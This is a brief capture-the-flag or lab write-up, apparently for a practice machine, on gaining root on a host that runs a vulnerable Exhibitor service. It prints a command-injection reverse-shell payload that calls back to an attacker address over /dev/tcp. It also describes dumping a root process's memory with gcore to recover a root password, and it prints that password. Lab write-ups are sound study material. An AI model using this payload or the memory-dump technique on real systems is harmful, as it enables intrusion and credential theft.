## Writeup:
After a quick scan, it's revealed that port 8081 gives access to an exhibitor instance which is vulnerable to remote code execution.
By plopping the following payload into the any field in the config tab, and restarting the service, initial access is gained: $(sh -i >& /dev/tcp/192.168.45.163/9001 0>&1)
Initial access is gained as the user 'charles'.
The user charles can run the /usr/bin/gcore command as root according to sudo.
Running this command allows the dumping of the memory of a given process.
'ps aux' reveals a process running as root called password-store
Dumping the core of this process, and running strings over it gives the password of the root user: ClogKingpinInning731
A quick 'su' switches our user to the root user and we can find proof.txt in his/her home directory.
